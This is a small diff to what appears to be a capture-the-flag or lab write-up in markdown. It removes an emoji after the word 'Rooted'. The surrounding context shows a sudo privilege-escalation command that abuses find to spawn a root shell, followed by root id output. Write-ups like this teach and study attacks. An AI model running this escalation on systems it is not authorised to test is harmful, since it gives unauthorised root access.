@@ -91,7 +91,7 @@ sudo find . -exec /bin/sh \; -quit
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Rooted. 🩸
+Rooted.
 
 ## Lessons learned
 
